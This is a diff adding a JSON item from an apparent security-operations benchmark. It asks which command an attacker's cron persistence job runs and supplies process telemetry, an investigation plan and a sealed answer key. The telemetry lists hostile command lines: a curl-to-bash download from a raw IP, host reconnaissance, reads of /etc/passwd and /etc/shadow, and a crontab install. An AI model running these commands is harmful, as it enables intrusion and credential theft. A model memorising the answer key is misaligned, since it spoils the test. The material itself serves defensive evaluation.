@@ -1,0 +1,274 @@
+{
+  "incident_id": "secops-q-c01-persistence",
+  "name": "SecOps case-01-recon/q-c01-persistence",
+  "source_benchmark": "Cyber-SecOps-ES",
+  "source_scenario": "case-01-recon/q-c01-persistence",
+  "alert": {
+    "timestamp": "2026-07-29T02:20:00Z",
+    "host": "ubuntu-2404-noble-amd64-base",
+    "user": "unknown",
+    "alert_type": "secops_investigation",
+    "summary": "The attacker installed a cron persistence entry. What command does that cron job run (the payload after the schedule)?",
+    "attck": [
+      "T1053.003"
+    ]
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "process_events"
+    ],
+    "start": "2026-07-29T02:20:00Z",
+    "end": "2026-07-29T02:21:30Z",
+    "hosts": [
+      "ubuntu-2404-noble-amd64-base"
+    ]
+  },
+  "telemetry": {
+    "process_events": [
+      {
+        "event_id": "evidence.process-proc-0001-da515430",
+        "timestamp": "2026-07-29T02:20:58.245Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s1.sh | bash"
+      },
+      {
+        "event_id": "evidence.process-proc-0002-89de689e",
+        "timestamp": "2026-07-29T02:20:58.247Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "bash",
+        "command_line": "bash"
+      },
+      {
+        "event_id": "evidence.process-proc-0003-11eba632",
+        "timestamp": "2026-07-29T02:20:58.247Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s1.sh"
+      },
+      {
+        "event_id": "evidence.process-proc-0004-dca79cb8",
+        "timestamp": "2026-07-29T02:20:58.272Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "whoami",
+        "parent_process_name": "bash",
+        "command_line": "whoami"
+      },
+      {
+        "event_id": "evidence.process-proc-0005-4b7094fc",
+        "timestamp": "2026-07-29T02:20:58.274Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "id",
+        "parent_process_name": "bash",
+        "command_line": "id"
+      },
+      {
+        "event_id": "evidence.process-proc-0006-dad137f3",
+        "timestamp": "2026-07-29T02:20:58.276Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "hostname",
+        "parent_process_name": "bash",
+        "command_line": "hostname"
+      },
+      {
+        "event_id": "evidence.process-proc-0007-178d5475",
+        "timestamp": "2026-07-29T02:20:58.278Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "uname",
+        "parent_process_name": "bash",
+        "command_line": "uname -a"
+      },
+      {
+        "event_id": "evidence.process-proc-0008-86449c2f",
+        "timestamp": "2026-07-29T02:20:58.280Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "cat",
+        "parent_process_name": "bash",
+        "command_line": "cat /etc/os-release"
+      },
+      {
+        "event_id": "evidence.process-proc-0009-85a64b08",
+        "timestamp": "2026-07-29T02:20:58.282Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "cat",
+        "parent_process_name": "bash",
+        "command_line": "cat /etc/passwd"
+      },
+      {
+        "event_id": "evidence.process-proc-0010-88e38449",
+        "timestamp": "2026-07-29T02:20:58.283Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "ps",
+        "parent_process_name": "bash",
+        "command_line": "ps aux"
+      },
+      {
+        "event_id": "evidence.process-proc-0011-cd1ef60d",
+        "timestamp": "2026-07-29T02:20:58.339Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "ss",
+        "parent_process_name": "bash",
+        "command_line": "ss -antp"
+      },
+      {
+        "event_id": "evidence.process-proc-0012-0015a88f",
+        "timestamp": "2026-07-29T02:21:00.219Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "sudo",
+        "parent_process_name": "bash",
+        "command_line": "sudo -n -l"
+      },
+      {
+        "event_id": "evidence.process-proc-0013-e69d409b",
+        "timestamp": "2026-07-29T02:21:00.398Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "cat",
+        "parent_process_name": "bash",
+        "command_line": "cat /etc/shadow"
+      },
+      {
+        "event_id": "evidence.process-proc-0014-05ad21bc",
+        "timestamp": "2026-07-29T02:21:00.406Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "crontab",
+        "parent_process_name": "bash",
+        "command_line": "crontab -"
+      },
+      {
+        "event_id": "evidence.process-proc-0015-1ebc1e55",
+        "timestamp": "2026-07-29T02:21:00.406Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "crontab",
+        "parent_process_name": "bash",
+        "command_line": "crontab -l"
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "evidence.process-proc-0001-da515430",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:20:58.245Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s1.sh | bash"
+      }
+    },
+    {
+      "event_id": "evidence.process-proc-0002-89de689e",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:20:58.247Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "bash",
+        "parent_process_name": "bash",
+        "command_line": "bash"
+      }
+    },
+    {
+      "event_id": "evidence.process-proc-0003-11eba632",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:20:58.247Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s1.sh"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "process_events",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "process_events",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "The attacker installed a cron persistence entry. What command does that cron job run (the payload after the schedule)?",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "process_events",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "process_events",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "The attacker installed a cron persistence entry. What command does that cron job run (the payload after the schedule)?",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-SecOps-ES",
+    "scenario": "case-01-recon/q-c01-persistence",
+    "answer": "/bin/echo benchmark_s1 >/tmp/.bench_persist",
+    "accept": [
+      "/bin/echo benchmark_s1 >/tmp/.bench_persist",
+      "echo benchmark_s1 >/tmp/.bench_persist",
+      "*/10 * * * * /bin/echo benchmark_s1 >/tmp/.bench_persist"
+    ],
+    "grading": "exact_ci",
+    "attck": [
+      "T1053.003"
+    ],
+    "sealed": true
+  }
+}
